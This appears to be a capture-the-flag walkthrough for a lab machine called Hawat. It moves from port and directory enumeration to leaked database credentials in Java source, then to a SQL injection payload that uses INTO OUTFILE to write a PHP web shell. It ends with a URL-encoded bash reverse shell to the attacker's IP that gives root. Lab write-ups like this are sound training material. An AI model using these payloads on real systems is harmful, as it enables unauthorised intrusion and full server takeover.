##### Tags: `SQLi`  `upload path`  `burp suite`  `RFI`  `issuetracker`

# 🐧Hawat🐧
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.223.147
PORT      STATE  SERVICE      VERSION
22/tcp    open   ssh          OpenSSH 8.4 (protocol 2.0)

17445/tcp open   http         Apache Tomcat (language: en)
30455/tcp open   http         nginx 1.18.0
50080/tcp open   http         Apache httpd 2.4.46 ((Unix) PHP/7.4.15)
```
port 17445 is running issuetracker  
  
port 30455 use gobuster found the phpinfo page  
```console
$ gobuster dir -u http://192.168.223.147:30455 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -b 302,404

/4                    (Status: 301) [Size: 169] [--> http://192.168.223.147:30455/4/]
/index.php            (Status: 200) [Size: 3356]
/phpinfo.php          (Status: 200) [Size: 68610]
Progress: 18452 / 18452 (100.00%)
```
found the upload path
```console
$_SERVER['DOCUMENT_ROOT']	         /srv/http
```
port 50080 use gobuster found the /cloud directory
```console
$ gobuster dir -u http://192.168.223.147:50080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -b 302,404

/index.html           (Status: 200) [Size: 9088]
/images               (Status: 301) [Size: 244] [--> http://192.168.223.147:50080/images/]
/4                    (Status: 301) [Size: 239] [--> http://192.168.223.147:50080/4/]
/cloud                (Status: 301) [Size: 243] [--> http://192.168.223.147:50080/cloud/]
```
use admin admin logged in and found the issuetracker.zip  
unzip and examinate the file  
found the file /issuetracker/src/main/java/com/issue/tracker/issuesIssueController.java got config details
```console
 @GetMapping("/issue/checkByPriority")
        public String checkByPriority(@RequestParam("priority") String priority, Model model) {
                // 
                // Custom code, need to integrate to the JPA
                //
            Properties connectionProps = new Properties();
            connectionProps.put("user", "issue_user");
            connectionProps.put("password", "ManagementInsideOld797");
        try {
                        conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/issue_tracker",connectionProps);
                    String query = "SELECT message FROM issue WHERE priority='"+priority+"'";
            System.out.println(query);
                    Statement stmt = conn.createStatement();
                    stmt.executeQuery(query);
```
This code receives a priority value from a web request, connects to a MySQL database  
and runs a query to retrieve messages from the issue table that match that priority  
we create an account using those credential
```console
issue_user
ManagementInsideOld797
```
use burp suite go to
```console
http://192.168.223.147:17445/issue/checkByPriority
```
send to repeater and change to post method  
since we know the upload path in srv/http
```console
POST /issue/checkByPriority?priority=%27%20UNION%20SELECT%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%22%20INTO%20OUTFILE%20%22%2Fsrv%2Fhttp%2Fshell.php%22--%20-
 HTTP/1.1
Host: 192.168.223.147:17445
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: JSESSIONID=B048E1ECF8D80E6C038BE20E3E2E855B
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
go to http://192.168.223.147:30455/shell.php?cmd=id
```console
uid=0(root) gid=0(root) groups=0(root)
```
we have RFI now  
simple put a url encoded reverse shell in burp suite
```console
GET /shell.php?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.212%2F22%200%3E%261 HTTP/1.1
Host: 192.168.223.147:30455
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: JSESSIONID=B048E1ECF8D80E6C038BE20E3E2E855B
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
we got the root shell
```console
$ penelope -p 22              
[+] Listening for reverse shells on 0.0.0.0:22 →  127.0.0.1 • 10.0.2.15 • 192.168.45.212
[root@hawat http]# id
uid=0(root) gid=0(root) groups=0(root)
```
